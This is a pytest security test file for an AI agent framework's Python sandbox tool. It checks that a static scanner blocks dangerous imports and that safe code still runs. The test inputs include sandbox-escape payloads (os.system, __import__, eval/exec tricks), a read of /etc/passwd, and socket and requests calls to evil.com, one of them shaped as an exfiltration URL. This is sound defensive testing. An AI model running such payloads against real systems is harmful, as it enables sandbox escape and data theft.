"""
Security tests: code injection in the Python sandbox (ExecutePythonTool).
Verifies that dangerous patterns are blocked at the static analysis stage.
"""
from __future__ import annotations

import pytest

from agentcore.mcp.protocol import MCPContext
from agentcore.mcp.tools.code_exec import ExecutePythonTool, _check_blocked_imports


class TestDangerousImportsBlocked:
    """Static import scanner must block all dangerous modules."""

    @pytest.mark.asyncio
    async def test_os_system_blocked(self, online_context):
        """os.system() must be blocked — 'import os' triggers the scanner."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import os\nos.system('id')"},
            online_context,
        )
        assert result.success is False
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_subprocess_run_blocked(self, online_context):
        """subprocess.run() must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import subprocess\nsubprocess.run(['ls', '-la'])"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_dunder_import_trick_blocked(self, online_context):
        """__import__('subprocess') trick must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "__import__('subprocess').run(['id'])"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_eval_with_import_blocked(self, online_context):
        """eval() containing import must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "eval(\"__import__('os').system('id')\")"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_exec_with_import_blocked(self, online_context):
        """exec() containing import must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "exec('import os\\nos.system(\"id\")')"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_socket_import_blocked(self, online_context):
        """socket import must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import socket\ns = socket.socket()\ns.connect(('evil.com', 80))"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_requests_import_blocked(self, online_context):
        """requests import must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import requests\nr = requests.get('http://evil.com/exfil?d=secret')"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_httpx_import_blocked(self, online_context):
        """httpx import must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import httpx\nhttpx.get('http://evil.com')"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_urllib_import_blocked(self, online_context):
        """urllib import must be blocked."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import urllib\nurllib.request.urlopen('http://evil.com')"},
            online_context,
        )
        assert result.success is False

    @pytest.mark.asyncio
    async def test_safe_math_code_executes(self, online_context):
        """Pure math code without any dangerous imports must execute normally."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import math\nresult = math.sqrt(16)\nprint(result)"},
            online_context,
        )
        assert result.success is True
        assert "4.0" in result.content.get("stdout", "")

    @pytest.mark.asyncio
    async def test_json_import_allowed(self, online_context):
        """json module is safe and must be allowed."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "import json\nd = json.dumps({'key': 'value'})\nprint(d)"},
            online_context,
        )
        assert result.success is True

    @pytest.mark.asyncio
    async def test_builtins_open_check(self, online_context):
        """open() may or may not be blocked — at minimum code must not crash the process."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "f = open('/etc/passwd', 'r')\nprint(f.read())"},
            online_context,
        )
        # Either blocked (success=False) or restricted — must not raise an unhandled exception
        assert isinstance(result.success, bool)

    @pytest.mark.asyncio
    async def test_timeout_prevents_infinite_loop(self, online_context):
        """An infinite loop must be killed by the timeout mechanism."""
        tool = ExecutePythonTool()
        result = await tool.execute(
            {"code": "while True: pass", "timeout_seconds": 1},
            online_context,
        )
        assert result.success is False
        assert result.error is not None


class TestCheckBlockedImportsUnit:
    """Direct unit tests for the _check_blocked_imports scanner."""

    def test_os_blocked(self):
        assert _check_blocked_imports("import os") is not None

    def test_subprocess_blocked(self):
        assert _check_blocked_imports("import subprocess") is not None

    def test_socket_blocked(self):
        assert _check_blocked_imports("import socket") is not None

    def test_eval_blocked(self):
        assert _check_blocked_imports("eval('x')") is not None

    def test_exec_blocked(self):
        assert _check_blocked_imports("exec('x')") is not None

    def test_safe_code_passes(self):
        assert _check_blocked_imports("x = 2 + 2\nprint(x)") is None

    def test_math_import_passes(self):
        assert _check_blocked_imports("import math\nprint(math.pi)") is None

    def test_json_import_passes(self):
        assert _check_blocked_imports("import json") is None

    def test_datetime_import_passes(self):
        assert _check_blocked_imports("from datetime import datetime") is None
